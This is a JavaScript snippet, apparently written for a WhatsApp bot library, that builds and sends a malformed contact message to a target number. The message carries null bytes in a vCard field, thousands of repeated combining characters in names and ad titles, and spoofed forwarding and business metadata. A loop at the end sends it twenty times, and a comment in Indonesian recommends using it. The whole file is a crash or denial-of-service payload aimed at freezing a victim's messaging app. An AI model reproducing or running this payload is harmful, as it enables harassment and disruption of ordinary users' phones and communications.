async function cttForce(isTarget) {
  const displayName = "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯЯOR ⛧" + "ោ៝".repeat(41);
  const vcard = `BEGIN:VCARD
VERSION:3.0
N:𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂;𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂;;;
FN:𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂
item1.TEL;waid=5521992999999:+55 219-9299-9999
item1.X-ABLabel:Server
X-WA-BIZ-NAME:${"\u0000".repeat(41)}
END:VCARD`;

  const contact = generateWAMessageFromContent(isTarget, {
    contactMessage: {
      displayName,
      vcard,
      contextInfo: {
        mentionedJid: [isTarget],
        participant: "5521992999999@s.whatsapp.net",
        remoteJid: isTarget,
        forwardingScore: 9741,
        isForwarded: true,
        quotedMessage: {
        contactMessage: {
          displayName: "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧", 
          vcard: vcard.vcard 
          }
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "5521992999999@s.whatsapp.net"
        },
        dataSharingContext: {
          showMmDisclosure: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "5521992999999@newsletter",
          serverMessageId: 1,
          newsletterName: "-"
        },
        externalAdReply: {
          title: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(9741),
          mediaType: 2,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          containsAutoReply: true,
          body: "© T-Яyuichi",
          thumbnail: img300,
          sourceUrl: "",
          sourceId: client.generateMessageTag(),
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: false,
          originalimgLink: "https://instagram.com/@tamainfinity_"
        },
        quotedAd: {
          advertiserName: "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧",
          mediaType: "IMAGE",
          jpegThumbnail: img300,
          caption: "menipulation contact ?"
        },
        placeholderKey: {
          remoteJid: "5521992999999@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }
  }, { quoted: {
     key: { particiapant: "5521992999999@s.whatsapp.net", remoteJid: isTarget, fromMe: true }, 
        message: { 
           contactMessage: {
              displayName: "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧", 
              vcard: vcard.vcard 
           }
        }
     }  
  });

  await client.relayMessage(isTarget, contact.message, {
    particiapant: { jid: isTarget },
    messageId: contact.key.id
  });
}

// saran pake ini aja wok
for (let r = 0; r < 10; r++) {
await cttForce(isTarget)
await cttForce(isTarget) 
}